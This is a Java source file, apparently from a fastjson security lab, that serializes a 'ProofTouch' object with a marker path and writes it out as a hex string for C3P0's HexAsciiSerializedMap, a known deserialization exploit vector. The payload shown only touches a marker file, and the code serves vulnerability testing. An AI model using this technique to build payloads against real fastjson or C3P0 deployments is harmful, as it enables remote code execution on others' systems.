package com.fastjsonlab;

import java.io.ByteArrayOutputStream;
import java.io.FileOutputStream;
import java.io.ObjectOutputStream;
import java.nio.charset.StandardCharsets;

/** 生成 C3P0 HexAsciiSerializedMap 用的十六进制串。 */
public class SerializeProof {
    public static void main(String[] args) throws Exception {
        String outPath = args.length > 0 ? args[0] : "c3p0-proof.hex";
        String marker = args.length > 1 ? args[1] : "/tmp/fj1247_c3p0";

        ByteArrayOutputStream bos = new ByteArrayOutputStream();
        try (ObjectOutputStream oos = new ObjectOutputStream(bos)) {
            oos.writeObject(new ProofTouch(marker));
        }
        byte[] raw = bos.toByteArray();
        StringBuilder hex = new StringBuilder(raw.length * 2);
        for (byte b : raw) {
            hex.append(String.format("%02X", b & 0xff));
        }
        try (FileOutputStream fos = new FileOutputStream(outPath)) {
            fos.write(hex.toString().getBytes(StandardCharsets.US_ASCII));
        }
        System.out.println("wrote " + outPath + " (" + raw.length + " bytes)");
    }
}
